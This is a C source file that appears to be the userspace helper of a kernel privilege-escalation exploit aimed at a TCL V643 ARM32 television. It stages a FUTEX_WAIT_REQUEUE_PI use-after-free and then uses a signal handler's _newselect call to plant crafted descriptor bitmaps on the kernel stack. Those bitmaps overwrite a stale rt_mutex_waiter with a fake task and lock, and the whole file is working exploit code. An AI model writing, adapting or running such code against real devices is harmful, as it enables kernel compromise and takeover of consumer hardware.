#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "tcl_v643/mcast_helper_protocol.h"
#include "tcl_v643/pselect_carrier.h"

static uint64_t get64(const uint8_t *p) {
  uint64_t value;
  memcpy(&value, p, sizeof(value));
  return value;
}

#define GL_ARM_NR_NEWSELECT 142U

static struct tcl_v643_mcast_shared *shared;
static struct tcl_v643_pselect_carrier select_carrier;
static int select_source_fd = -1;
static int select_peer_fd = -1;

static long futex_call(uint32_t *uaddr, int op, uint32_t val,
                       const void *arg4, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, val3);
}

static void helper_fail(void) {
  atomic_fetch_add_explicit(&shared->failures, 1, memory_order_relaxed);
}

/* waiter_waiting is deliberately written immediately before the futex call,
 * so it only proves userspace intent.  Observe the live syscall from the
 * helper's process leader and require three consecutive matching samples.
 * This removes the fixed-delay race without dereferencing kernel memory. */
static int observe_waiter_futex(uint32_t tid) {
  char path[96];
  char line[256];
  unsigned stable = 0;

  snprintf(path, sizeof(path), "/proc/self/task/%u/syscall", tid);
  for (unsigned sample = 0; sample < 1000; sample++) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    ssize_t n = -1;
    if (fd >= 0) {
      n = read(fd, line, sizeof(line) - 1);
      close(fd);
    }
    if (n > 0) {
      long nr = -1;
      unsigned long uaddr = 0, op = 0;
      line[n] = '\0';
      if (sscanf(line, "%ld %lx %lx", &nr, &uaddr, &op) == 3 &&
          nr == SYS_futex &&
          uaddr == (unsigned long)(uintptr_t)&shared->f_wait &&
          (op & FUTEX_CMD_MASK) == FUTEX_WAIT_REQUEUE_PI) {
        if (++stable >= 3) return 1;
      } else {
        stable = 0;
      }
    } else {
      stable = 0;
    }
    usleep(1000);
  }
  return 0;
}

/* Prove from a separate thread that the waiter is still inside the exact
 * compat _newselect call after its three input bitmaps were copied.  The
 * syscall number alone is not enough: also match nfds and all three user
 * pointers so an unrelated select cannot release the PI walk. */
static int observe_waiter_newselect(uint32_t tid) {
  char path[96];
  char line[256];
  unsigned stable = 0;

  snprintf(path, sizeof(path), "/proc/self/task/%u/syscall", tid);
  for (unsigned sample = 0; sample < 2000; sample++) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    ssize_t n = -1;
    if (fd >= 0) {
      n = read(fd, line, sizeof(line) - 1);
      close(fd);
    }
    if (n > 0) {
      long nr = -1;
      unsigned long nfds = 0, readp = 0, writep = 0, exceptp = 0;
      line[n] = '\0';
      if (sscanf(line, "%ld %lx %lx %lx %lx", &nr, &nfds,
                 &readp, &writep, &exceptp) == 5 &&
          nr == GL_ARM_NR_NEWSELECT &&
          nfds == TCL_V643_PSELECT_NFDS &&
          readp == (unsigned long)(uintptr_t)select_carrier.readfds &&
          writep == (unsigned long)(uintptr_t)select_carrier.writefds &&
          exceptp == (unsigned long)(uintptr_t)select_carrier.exceptfds) {
        if (++stable >= 3) return 1;
      } else {
        stable = 0;
      }
    } else {
      stable = 0;
    }
    usleep(1000);
  }
  return 0;
}

static int setup_newselect_carrier(void) {
  int sv[2] = {-1, -1};
  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0)
    return 0;

  /* Keep both endpoints above the 0..319 fd bitmap.  Selected descriptor
   * numbers are then replaced by duplicates of the quiet read endpoint;
   * the high peer remains open so neither EOF nor POLLHUP wakes select. */
  select_source_fd = fcntl(sv[0], F_DUPFD_CLOEXEC,
                           TCL_V643_PSELECT_NFDS + 64);
  select_peer_fd = fcntl(sv[1], F_DUPFD_CLOEXEC,
                         TCL_V643_PSELECT_NFDS + 65);
  close(sv[0]);
  close(sv[1]);
  if (select_source_fd < 0 || select_peer_fd < 0) return 0;

  tcl_v643_build_pselect_carrier(
      &select_carrier, shared->message.fake_task,
      shared->message.fake_lock, shared->message.wake_state,
      shared->message.prio);
  for (unsigned fd = 0; fd < TCL_V643_PSELECT_NFDS; fd++) {
    if (tcl_v643_carrier_fd_selected(&select_carrier, fd) &&
        dup2(select_source_fd, (int)fd) < 0)
      return 0;
  }
  return 1;
}

/* tgkill is directed at the waiter TID, so this handler runs on the same
 * task whose pi_blocked_on still references the stale rt_mutex_waiter.
 * The exact V643 ARM32 _newselect frame places stack_fds at waiter-0x30;
 * the copied bitmaps therefore rewrite task/lock/wake_state/prio and remain
 * resident while do_select blocks.  The process leader observes that live
 * syscall before releasing the coordinator. */
static void sigusr1_handler(int sig) {
  (void)sig;
  if (!atomic_load_explicit(&shared->bug_armed, memory_order_acquire))
    return;

  struct timeval timeout = {.tv_sec = 5, .tv_usec = 0};
  errno = 0;
  shared->diag_carrier_ret = (int32_t)syscall(
      GL_ARM_NR_NEWSELECT, TCL_V643_PSELECT_NFDS,
      select_carrier.readfds, select_carrier.writefds,
      select_carrier.exceptfds, &timeout);
  shared->diag_carrier_errno = errno;

  while (!atomic_load_explicit(&shared->round_done, memory_order_acquire))
    atomic_signal_fence(memory_order_seq_cst);
  atomic_store_explicit(&shared->handler_done, 1, memory_order_release);
}

static void *waiter_main(void *unused) {
  (void)unused;
  struct timespec deadline;
  uint32_t dummy_pi;

  /* Used only by the source-built QEMU kernel's filtered diagnostics.  It
   * has no scheduling or exploit semantic effect on the television. */
  (void)prctl(PR_SET_NAME, "glqemu-waiter", 0, 0, 0);
  atomic_store(&shared->helper_tid, (uint32_t)syscall(SYS_gettid));
  atomic_store(&shared->helper_uid, (uint32_t)getuid());
  atomic_store(&shared->helper_ready, 1);

  if (futex_call(&shared->f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    helper_fail();
    return NULL;
  }
  atomic_store(&shared->waiter_ready, 1);
  while (!atomic_load(&shared->owner_started)) sched_yield();

  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += 10;
  atomic_store(&shared->waiter_waiting, 1);
  errno = 0;
  shared->diag_wait_ret = (int32_t)futex_call(
      &shared->f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &deadline,
      &shared->f_target, 0);
  shared->diag_wait_errno = errno;

  /* Force the restarted waiter through a bounded ETIMEDOUT cleanup.  The
   * process leader stays alive in pthread_join, so it is a valid apparent
   * PI owner distinct from this waiter TID. */
  dummy_pi = FUTEX_WAITERS | (uint32_t)getpid();
  {
    struct timespec expired = {0, 0};
    errno = 0;
    long ret = futex_call(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
    shared->diag_disarm_errno = errno;
    if (ret != -1 || errno != ETIMEDOUT)
      helper_fail();
    else
      atomic_store(&shared->cleanup_done, 1);
  }

  if (futex_call(&shared->f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0)
    helper_fail();
  return NULL;
}

static int run_helper(int fd) {
  struct sigaction sa;
  pthread_t waiter;

  shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
  if (shared == MAP_FAILED ||
      shared->message.magic != TCL_V643_MCAST_HELPER_MAGIC ||
      shared->message.version != TCL_V643_MCAST_HELPER_VERSION ||
      shared->message.size != sizeof(shared->message) ||
      shared->message.flags != TCL_V643_HELPER_CARRIER_NEWSELECT ||
      sizeof(void *) != 4)
    return 1;

  if (!setup_newselect_carrier()) return 1;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1_handler;
  sigemptyset(&sa.sa_mask);
  sigaddset(&sa.sa_mask, SIGUSR1);
  sa.sa_flags = SA_RESTART;
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;
  if (pthread_create(&waiter, NULL, waiter_main, NULL) != 0) return 1;
  for (unsigned i = 0; i < 5000 &&
       !atomic_load_explicit(&shared->waiter_waiting,
                             memory_order_acquire); i++)
    usleep(1000);
  uint32_t tid = atomic_load_explicit(&shared->helper_tid,
                                      memory_order_acquire);
  if (!atomic_load_explicit(&shared->waiter_waiting,
                            memory_order_acquire) ||
      !tid || !observe_waiter_futex(tid)) {
    helper_fail();
    return 1;
  }
  atomic_store_explicit(&shared->waiter_observed, 1,
                        memory_order_release);
  for (unsigned i = 0; i < 5000 &&
       !atomic_load_explicit(&shared->bug_armed,
                             memory_order_acquire); i++)
    usleep(1000);
  if (!atomic_load_explicit(&shared->bug_armed, memory_order_acquire) ||
      !observe_waiter_newselect(tid)) {
    helper_fail();
  } else {
    atomic_store_explicit(&shared->carrier_observed, 1,
                          memory_order_release);
  }
  /* Release the coordinator only after _newselect is proven live.  On an
   * observation failure this still unblocks the verifier, which fails
   * closed before signalling the owner. */
  atomic_store_explicit(&shared->round_go, 1, memory_order_release);
  pthread_join(waiter, NULL);
  return atomic_load(&shared->failures) ? 1 : 0;
}

static int selftest(void) {
  const uint64_t task = UINT64_C(0xffffff8001234480);
  const uint64_t lock = UINT64_C(0xffffff8001234100);
  struct tcl_v643_pselect_carrier carrier;
  struct tcl_v643_mcast_helper_message message = {
      .magic = TCL_V643_MCAST_HELPER_MAGIC,
      .version = TCL_V643_MCAST_HELPER_VERSION,
      .size = sizeof(message),
      .flags = TCL_V643_HELPER_CARRIER_NEWSELECT,
      .fake_task = task,
      .fake_lock = lock,
      .wake_state = 3,
      .prio = 1,
  };

  if (sizeof(void *) != 4) {
    fprintf(stderr, "FAIL: helper is not an AArch32/ILP32 executable\n");
    return 1;
  }
  tcl_v643_build_pselect_carrier(&carrier, message.fake_task,
                                 message.fake_lock, message.wake_state,
                                 message.prio);
  if (message.magic != TCL_V643_MCAST_HELPER_MAGIC ||
      message.version != TCL_V643_MCAST_HELPER_VERSION ||
      TCL_V643_MCAST_HELPER_VERSION != 5 || message.size != 40 ||
      message.flags != TCL_V643_HELPER_CARRIER_NEWSELECT ||
      sizeof(carrier) != 3 * TCL_V643_FDSET_BYTES ||
      get64(carrier.exceptfds + 0x10) != task ||
      get64(carrier.exceptfds + 0x18) != lock) {
    fprintf(stderr, "FAIL: helper protocol/carrier invariant\n");
    return 1;
  }

  puts("PASS: AArch32 TCL V643 _newselect helper ABI and +0x30 carrier layout");
  puts("SAFE: self-test only; no futex, select, reclaim or kernel address used");
  return 0;
}

int main(int argc, char **argv) {
  if (argc == 2 && strcmp(argv[1], "--selftest") == 0)
    return selftest();

  if (argc == 3 && strcmp(argv[1], "--run-fd") == 0) {
    char *end = NULL;
    long fd = strtol(argv[2], &end, 10);
    if (!end || *end || fd < 0 || fd > 1024) return 2;
    return run_helper((int)fd);
  }

  fprintf(stderr,
          "usage: %s --selftest | --run-fd FD\n", argv[0]);
  return 2;
}
